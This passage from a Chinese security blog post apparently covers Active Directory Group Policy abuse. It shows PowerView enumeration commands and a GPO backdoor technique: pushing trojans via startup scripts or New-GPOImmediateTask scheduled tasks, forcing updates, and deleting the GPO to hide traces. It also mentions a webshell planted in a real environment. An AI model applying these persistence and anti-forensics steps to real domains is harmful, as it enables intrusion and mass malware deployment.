style="font-size:15px;line-height:35px;;"><strong>2.查看域用户信息</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">powershell</span> Get-DomainUser -identity gpptest</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">可以看到该用户属于GPPVuln的OU组</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5808625336927223" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/33_5Cw12rVt6aWLNHF9R6siccly74r05A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4AjicnP4mibHGdZGhPp33lVQLJvo5Cw12rVt6aWLNHF9R6siccly74r05A/640?wx_fmt=png'" data-type="png" data-w="742"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>3.查看OU组信息</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="nginx"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">powershell</span> Get-DomainOU -identity GPPVuln</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">发现有个GPO的link链接信息，然后我们根据这个GPUD去相应的文件夹进行搜索就可以了</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.1553398058252427" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/34_r5XFX6Y7nBHXxDLQspdJo20kxymAeQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4vjXdjrKQhMjlCl7ia3SrT4OOar5XFX6Y7nBHXxDLQspdJo20kxymAeQ/640?wx_fmt=png'" data-type="png" data-w="721"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h3><strong><span style="font-size:15px;line-height:35px;;">0x2.3.3 后门利用</span></strong><span style="font-size:15px;line-height:35px;;"></span></h3><p><strong><span style="font-size:15px;line-height:35px;;"><br  /></span></strong></p><p><span style="font-size:15px;line-height:35px;;">这个后门的利用的前提是我们已经拿下了域控的权限。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">通过GPO我们可以指定控制OU下的所有用户，比如批量下发木马或者进行其他操作。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>1.直接的方式</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">比如简单和暴力的方式,就是直接将我们的木马当成脚本放在域策略或者自己新建个GPO然后在启动|关闭中放入我们的木马,然后将该GPO链接到你想搞的OU下,这样就可以实现定向打击,这种感觉比较明显吧,很容易就可以排查出来了。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>2.计划任务实现远程执行</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这种方式能够按照时间定时的收集信息，相对来说比较隐蔽。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这里演示下如何使用New-GPOImmediateTask.ps1</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>1.导入powershell中管理GPO的模块&amp;创建一个作用整个域的GPO</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="powershell"><code><span class="code-snippet_outer"><span class="code-snippet__built_in">Import-Module</span> GroupPolicy –verbose</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>2.执行脚本添加计划任务</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">New</span>-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath <span class="code-snippet__string">'\\dc\sysvol\test1.local'</span> -CommandArguments <span class="code-snippet__string">'-c "123 | Out-File C:\test\debug.txt"'</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.5474452554744526" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/35_2wibRBTngLZ4y2yU9lIahHNaKhlbKw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4hkxRbvQnQ4Ou2KNI26IDdUhRH2wibRBTngLZ4y2yU9lIahHNaKhlbKw/640?wx_fmt=png'" data-type="png" data-w="959"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="0.6474820143884892" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/36_QNlqDU9ibLXTI9G6HM69jgDraOkCSQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4brVibRVS38EmPHgDZROphicibdPDQNlqDU9ibLXTI9G6HM69jgDraOkCSQ/640?wx_fmt=png'" data-type="png" data-w="834"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>3.强制更新组策略，或者默认等待90分组等待组策略强制更新</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="javascript"><code><span class="code-snippet_outer">Invoke-GPUpdate -Computer <span class="code-snippet__string">"TEST\COMPUTER-01"</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>4.清理痕迹</strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">Remove-GPO -Name TestGPO</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><h1><span style="font-size:18px;line-height:38px;;"><strong>0x03 后记</strong></span></h1><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">这是我在一个实战域环境内用冰蝎上马后查看gpp共享，但是好像他这个文件夹里面没有放bat</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><img data-ratio="1.1907131011608623" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/37_WTcz6em6rE9mln2Kb5BNn9xwrU7HKw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou87SZxHbIXs0zFywIovxeA4ckIUfH8FAWGsSDWfjvysCVbzWTcz6em6rE9mln2Kb5BNn9xwrU7HKw/640?wx_fmt=png'" data-type="png" data-w="603"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">所以并不是每一个域环境内的情况都是一样的，这里只是给师傅们提供个思路</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">总体来说，共享组策略目录是域中最容易出现密码的地方，一般管理员会把一些bat脚本放在里面用来重置域内客户机器本地的administrator的密码，所以当我们进入内网之后如果遇到横向不动的情况，就可以查看一下gpp，查看共享组策略目录中是否存在密码</span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__0" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><img data-type="png" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/38_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="box-sizing: border-box !important;visibility: visible !important;width: 640px !important;"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__1" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__2" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="color: rgb(0, 0, 0);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)">推荐阅读：</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">本月报名可以参加抽奖送暗夜精灵6Pro笔记本电脑的优惠活动</span><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__3" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><br  /></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247496352&amp;idx=1&amp;sn=df6ddbf35ac56259299ce37681d56e5b&amp;chksm=ec1ca79fdb6b2e8946f91d54722a7abb04f83111f9d348090167b804bc63b40d3efeb9beabbe&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" hasload="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="line-height: 0;inset: auto;"><img class="rich_pages" data-galleryid="" data-ratio="0.4269788182831661" data-s="300,640" data-type="jpeg" data-w="897" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/39_ZtzN9KGsEWibPgYw55Lkm5VuKthibQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg'" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 36px;inset: auto;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255);" class="js_darkmode__5" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__6" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)" style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" data-darkmode-color-16198392309037="rgb(255, 104, 39)" data-darkmode-original-color-16198392309037="#fff|rgb(255, 104, 39)">点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__7" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><br data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)"  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: right;" data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" class="js_darkmode__8" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;color: rgb(163, 163, 163) !important;"><span data-darkmode-bgcolor-16198392309037="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16198392309037="#fff|rgb(255, 255, 255)" style="font-size:12px;line-height:32px;;">原创投稿作者：</span><span style="color: rgba(0, 0, 0, 0.3);letter-spacing: 0.544px;text-align: start;font-size:12px;line-height:32px;;">Drunkmars</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img class="rich_pages __bg_gif" data-galleryid="" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2021-05-18_内网渗透浅谈域渗透中的组策略及gpp运用/40_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></p><p><br  /></p>
                </div>
</div>
</body>
</html>